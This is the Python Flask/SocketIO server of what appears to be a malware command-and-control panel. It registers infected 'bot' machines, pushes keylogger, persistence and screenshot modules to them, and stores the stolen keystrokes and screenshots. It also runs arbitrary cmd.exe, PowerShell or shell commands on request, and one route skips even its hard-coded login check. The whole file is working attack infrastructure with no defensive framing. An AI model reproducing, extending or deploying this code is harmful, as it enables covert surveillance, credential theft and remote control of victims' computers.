from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from flask_socketio import SocketIO
import subprocess, keylogger, persistence, screenshot
from requests import post, get

app = Flask(__name__)
socketio = SocketIO(app)
app.secret_key = 'Fixer'

USERNAME = 'Leopard'
PASSWORD = 'leopard'
idNum = 0
database = []
completedTasks = []
screenshotNumber = 0
keyloggerNumber = 0
persistenceVariable = False

class TaskDone:
    def __init__(self, info):
        self.idNum = info['idNum']
        self.hostname = info['hostname']
        self.commandSent = info['commandSent']
        self.output = info['DATA']

class Client:
    def __init__(self, info):
        global idNum
        self.idNum = idNum
        idNum += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']
        self.status = "Alive"

@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))

@app.route('/login.html', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == USERNAME and password == PASSWORD:
            session['loggedin'] = True
            session['username'] = USERNAME
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')

@app.route('/dashboard.html')
def dashboard():
    if session.get('loggedin'):
        return render_template('dashboard.html', database=database)
    return redirect(url_for('login'))

@app.route('/modules.html', methods=['GET', 'POST'])
def modules():
    if session.get('loggedin'):
        if request.method == 'POST':
            idNumber = request.form.get('idNumber')
            command = request.form.get('command')
            hostname = None
            client_info = next((client for client in database if client.idNum == int(idNumber)), None)

            if client_info:
                hostname = client_info.hostname

            if command == 'keylogger':
                keylogger_output = keylogger.start_keylogger()
                if keylogger_output:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'KEYLOGGER',
                        'DATA': "Keylogger start Failed"
                    }))
                else:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'KEYLOGGER',
                        'DATA': "Keylogger started"
                    }))
            elif command == 'persistence':
                try:
                    persistence_output = persistence.try_persistence()
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'PERSISTENCE',
                        'DATA': "Persistence command executed successfully"
                    }))
                except Exception as e:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'PERSISTENCE',
                        'DATA': f"Error executing persistence command: {str(e)}"
                    }))
            elif command == 'screenshot':
                output_dir = r'./static/receivedData/screenshots/'
                screenshot_path = screenshot.take_screenshot(output_dir)
                if isinstance(screenshot_path, str):
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'SCREENSHOT',
                        'DATA': f"Screenshot taken and saved at: {screenshot_path}"
                    }))
                else:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'SCREENSHOT',
                        'DATA': f"Error Taking Screenshot: {screenshot_path}"
                    }))
        return render_template('modules.html', taskDb=completedTasks)
    return redirect(url_for('login'))

@app.route('/commands.html', methods=['GET', 'POST'])
def commands():
    if request.method == 'POST':
        user_command = request.form['command']
        output = run_command(user_command)
        return render_template('commands.html', output=output)
    return render_template('commands.html')

@app.route('/execute_command', methods=['POST'])
def execute_command():
    data = request.json
    bot_id = data.get('botId')
    command = data.get('command')

    if not bot_id:
        return jsonify({'result': 'Single command executed on multiple bots'})

    result = run_command(command)
    return jsonify({'result': result})

def run_command(command):
    try:
        if command.startswith("shell"):
            args = command.split()[1:]
            f = "cmd.exe"
            arg = "/c "
            for a in args:
                arg += a + " "
        elif command.startswith("powershell"):
            args = command.split()[1:]
            f = "powershell.exe"
            arg = "-Command "
            for a in args:
                arg += a + " "
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            output_str = output.decode('utf-8') if output else ""
            error_str = error.decode('utf-8') if error else ""

            if error_str:
                result = f"Error: {error_str}"
            else:
                result = f"Output: {output_str}"

            return result

        process = subprocess.Popen([f, arg], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8') if output else ""
        error_str = error.decode('utf-8') if error else ""

        if error_str:
            result = f"Error: {error_str}"
        else:
            result = f"Output: {output_str}"

        return result

    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/logout.html')
def logout():
    session.pop('loggedin', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@socketio.on('connect')
def onConnect():
    pass

@socketio.on('message')
def handleMessage(message):
    command = message.get('COMMAND')
    if command == 'INFO':
        database.append(Client(message))
    elif command == 'OUTPUT':
        if 'persistence' in message['commandSent']:
            if message['PV']:
                for x in database:
                    if x.idNum == message['idNum']:
                        x.persistence = True

            if "screenshot" in message['commandSent']:
                global screenshotNumber
                with open(f'./static/receivedData/screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
                    f.write(message['DATA'])
                    tmp = f'/static/receivedData/screenshots/screenshot_{screenshotNumber}.png'
                    message['DATA'] = tmp
                    screenshotNumber += 1

            if 'keylogger' in message['commandSent']:
                global keyloggerNumber
                with open(f'./static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
                    f.write(message['DATA'])
                    tmp = f'/static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt'
                    message['DATA'] = tmp
                    keyloggerNumber += 1

            completedTasks.append(TaskDone(message))
    elif command == 'status update':
        for c in database:
            if c.idNum == message['idNum']:
                c.status = "Dead"

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0')
